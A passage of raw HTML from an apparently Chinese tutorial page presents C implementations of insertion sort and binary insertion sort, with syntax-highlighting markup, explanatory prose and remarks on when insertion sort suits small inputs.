class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span><span class=\"crayon-c\">// 从小到大插入排序</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b72592537449-29\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b72592537449-30\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">InsertionSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b72592537449-31\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"插入排序结果：\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b72592537449-32\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b72592537449-33\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b72592537449-34\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"%d \"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b72592537449-35\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b72592537449-36\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"\\n\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b72592537449-37\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b72592537449-38\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.1970 seconds] -->\r\n<p>上述代码对序列{ 6, 5, 3, 1, 8, 7, 2, 4 }进行插入排序的实现过程如下</p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1fr773qfw86g208c050q55.gif\" width=\"300\" height=\"180\"></p>\n<p>使用插入排序为一列数字进行排序的宏观过程：</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fr773r2k7ig207s06lq5y.gif\" width=\"280\" height=\"237\"></p>\n<p>插入排序不适合对于数据量比较大的排序应用。但是，如果需要排序的数据量很小，比如量级小于千，那么插入排序还是一个不错的选择。 插入排序在工业级库中也有着广泛的应用，在STL的sort算法和stdlib的qsort算法中，都将插入排序作为快速排序的补充，用于少量元素的排序（通常为8个或以下）。</p>\n<h2>插入排序的改进：二分插入排序</h2>\n<p>对于插入排序，如果比较操作的代价比交换操作大的话，可以采用<strong>二分查找法</strong>来减少比较操作的次数，我们称为<strong>二分插入排序</strong>，代码如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4ad567a1b78079446195\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#include &lt;stdio.h&gt;\r\n\r\n// 分类 -------------- 内部比较排序\r\n// 数据结构 ---------- 数组\r\n// 最差时间复杂度 ---- O(n^2)\r\n// 最优时间复杂度 ---- O(nlogn)\r\n// 平均时间复杂度 ---- O(n^2)\r\n// 所需辅助空间 ------ O(1)\r\n// 稳定性 ------------ 稳定\r\n\r\nvoid InsertionSortDichotomy(int A[], int n)\r\n{\r\n    for (int i = 1; i &lt; n; i++)\r\n    {\r\n        int get = A[i];                    // 右手抓到一张扑克牌\r\n        int left = 0;                    // 拿在左手上的牌总是排序好的，所以可以用二分法\r\n        int right = i - 1;                // 手牌左右边界进行初始化\r\n        while (left &lt;= right)            // 采用二分法定位新牌的位置\r\n        {\r\n            int mid = (left + right) / 2;\r\n            if (A[mid] &gt; get)\r\n                right = mid - 1;\r\n            else\r\n                left = mid + 1;\r\n        }\r\n        for (int j = i - 1; j &gt;= left; j--)    // 将欲插入新牌位置右边的牌整体向右移动一个单位\r\n        {\r\n            A[j + 1] = A[j];\r\n        }\r\n        A[left] = get;                    // 将抓到的牌插入手牌\r\n    }\r\n}\r\n\r\n\r\nint main()\r\n{\r\n    int A[] = { 5, 2, 9, 4, 7, 6, 1, 3, 8 };// 从小到大二分插入排序\r\n    int n = sizeof(A) / sizeof(int);\r\n    InsertionSortDichotomy(A, n);\r\n    printf(\"二分插入排序结果：\");\r\n    for (int i = 0; i &lt; n; i++)\r\n    {\r\n        printf(\"%d \", A[i]);\r\n    }\r\n    printf(\"\\n\");\r\n    return 0;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b78079446195-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b78079446195-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b78079446195-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b78079446195-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b78079446195-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b78079446195-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b78079446195-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b78079446195-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b78079446195-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b78079446195-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b78079446195-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b78079446195-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b78079446195-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b78079446195-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b78079446195-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b78079446195-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b78079446195-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b78079446195-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b78079446195-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b78079446195-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b78079446195-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b78079446195-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b78079446195-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b78079446195-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b78079446195-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b78079446195-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b78079446195-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b78079446195-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b78079446195-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b78079446195-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b78079446195-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b78079446195-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b78079446195-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b78079446195-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b78079446195-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b78079446195-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b78079446195-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b78079446195-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b78079446195-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b78079446195-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b78079446195-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b78079446195-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b78079446195-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b78079446195-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b78079446195-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b78079446195-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b78079446195-47\">47</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b78079446195-1\"><span class=\"crayon-p\">#include &lt;stdio.h&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b78079446195-2\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b78079446195-3\"><span class=\"crayon-c\">// 分类 -------------- 内部比较排序</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b78079446195-4\"><span class=\"crayon-c\">// 数据结构 ---------- 数组</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b78079446195-5\"><span class=\"crayon-c\">// 最差时间复杂度 ---- O(n^2)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b78079446195-6\"><span class=\"crayon-c\">// 最优时间复杂度 ---- O(nlogn)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b78079446195-7\"><span class=\"crayon-c\">// 平均时间复杂度 ---- O(n^2)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b78079446195-8\"><span class=\"crayon-c\">// 所需辅助空间 ------ O(1)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b78079446195-9\"><span class=\"crayon-c\">// 稳定性 ------------ 稳定</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b78079446195-10\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b78079446195-11\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">InsertionSortDichotomy</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b78079446195-12\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b78079446195-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b78079446195-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b78079446195-15\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">get</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">                    </span><span class=\"crayon-c\">// 右手抓到一张扑克牌</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b78079446195-16\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">left</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">                    </span><span class=\"crayon-c\">// 拿在左手上的牌总是排序好的，所以可以用二分法</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b78079446195-17\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">                </span><span class=\"crayon-c\">// 手牌左右边界进行初始化</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b78079446195-18\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">left</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">            </span><span class=\"crayon-c\">// 采用二分法定位新牌的位置</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b78079446195-19\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b78079446195-20\"><span class=\"crayon-h\">            </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">left</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b78079446195-21\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">mid</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">get</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b78079446195-22\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">right</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b78079446195-23\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">else</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b78079446195-24\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">left</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b78079446195-25\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b78079446195-26\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">left</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 将欲插入新牌位置右边的牌整体向右移动一个单位</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b78079446195-27\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b78079446195-28\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b78079446195-29\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b78079446195-30\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">left</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">get</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">                    </span><span class=\"crayon-c\">// 将抓到的牌插入手牌</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b78079446195-31\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b78079446195-32\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b78079446195-33\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b78079446195-34\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b78079446195-35\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b78079446195-36\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b78079446195-37\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span><span class=\"crayon-c\">// 从小到大二分插入排序</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b78079446195-38\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b78079446195-39\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">InsertionSortDichotomy</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b78079446195-40\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"二分插入排序结果：\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b78079446195-41\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b78079446195-42\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b78079446195-43\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"%d \"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b78079446195-44\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" 